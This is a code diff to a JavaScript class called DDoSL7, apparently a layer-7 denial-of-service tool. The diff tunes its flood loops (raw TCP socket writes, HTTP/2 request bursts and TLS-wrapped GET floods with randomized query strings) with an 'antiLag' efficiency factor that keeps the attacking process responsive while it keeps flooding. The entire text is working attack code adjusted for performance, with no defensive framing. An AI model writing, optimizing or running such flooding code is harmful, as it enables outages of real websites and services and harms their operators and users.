@@ -344,8 +344,10 @@ class DDoSL7 {
 
     executeVectors() {
         const strategy = this.ai.getStrategy();
+        const efficiency = antiLag.getEfficiencyFactor();
+        
         // Reduce base iterations to prevent blocking the event loop
-        let iterations = 5 * strategy.concurrencyMultiplier;
+        let iterations = Math.max(1, Math.floor(5 * strategy.concurrencyMultiplier * efficiency));
 
         if (this.safeModeActive) {
             iterations = 1; 
@@ -400,8 +402,9 @@ class DDoSL7 {
     }
 
     rawSocketFlood() {
+        const maxIterations = Math.max(1, Math.floor(50 * antiLag.getEfficiencyFactor()));
         const socket = net.connect(this.url.port || 80, this.resolvedIP, () => {
-            for(let i=0; i<50; i++) {
+            for(let i=0; i < maxIterations; i++) {
                 socket.write(this.pool.slice(crypto.randomInt(0, 32768), crypto.randomInt(32769, 65535)));
                 this.stats.requestsSent++;
                 this.stats.vectors.socket++;
@@ -569,8 +572,12 @@ class DDoSL7 {
                     maxHeaderListSize: 1073741823
                 }
             });
+            
+            const efficiency = antiLag.getEfficiencyFactor();
+            const maxRequests = Math.max(1, Math.floor(100 * efficiency));
+
             client.on('error', (err) => client.destroy());
-            for (let i = 0; i < 100; i++) {
+            for (let i = 0; i < maxRequests; i++) {
                 if (client.destroyed) break;
                 const headers = this.genHeaders();
                 const req = client.request({
@@ -610,8 +617,11 @@ class DDoSL7 {
                 sigalgs: this.sigalgs.join(':'),
                 honorCipherOrder: true
             };
+            
+            const maxRequests = Math.max(1, Math.floor(50 * antiLag.getEfficiencyFactor()));
+
             const socket = tls.connect(options, () => {
-                for (let i = 0; i < 50; i++) {
+                for (let i = 0; i < maxRequests; i++) {
                     const headers = this.genHeaders();
                     const raw = `GET ${this.url.pathname}?${this.puid()} HTTP/1.1\r\n` +
                                 `Host: ${this.url.hostname}\r\n` +
